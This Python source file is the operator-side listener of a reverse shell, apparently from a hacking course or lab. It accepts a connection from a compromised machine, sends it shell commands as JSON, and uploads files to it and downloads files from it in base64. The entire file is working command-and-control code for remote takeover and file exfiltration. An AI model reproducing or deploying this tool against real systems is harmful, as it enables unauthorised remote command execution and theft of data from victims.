import base64
import socket
import json


class SocketListener:
    def __init__(self, ip, port):
        myListener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        myListener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        myListener.bind((ip, port))
        myListener.listen(0)
        print("Listening...")
        (self.myConnection, myAddress) = myListener.accept()
        print("Connection connected from " + str(myAddress))

    def jsonSend(self, data):
        jsonData = json.dumps(data)
        self.myConnection.send(jsonData)

    def jsonReceive(self):
        jsonData = ""
        while True:
            try:
                jsonData = jsonData + self.myConnection.recv(1024)
                return json.loads(jsonData)
            except ValueError:
                continue

    def commandExecution(self, commandInput):
        self.jsonSend(commandInput)

        if commandInput[0] == "exit":
            self.myConnection.close()
            exit()
        return self.jsonReceive()

    def saveFileContent(self, path, content):
        with open(path, "wb") as myFile:
            myFile.write(base64.b64decode(content))
            return "Saved defined file..."

    def getFileContent(self, path):
        with open(path, "rb") as myFile:
            return base64.b64encode(myFile.read())

    def startListener(self):
        while True:
            commandInput = raw_input("Enter command: ")
            commandInput = commandInput.split(" ")
            try:
                if commandInput[0] == "upload":
                    myFileContent = self.getFileContent(commandInput[1])
                    commandInput.append(myFileContent)

                commandOutput = self.commandExecution(commandInput)

                if commandInput[0] == "download" and "Error!" not in commandOutput:
                    commandOutput = self.saveFileContent(
                        commandInput[1], commandOutput)
            except Exception:
                commandOutput = "Error!"
            print(commandOutput)


mySocketListener = SocketListener("10.0.2.10", 8080)
mySocketListener.startListener()
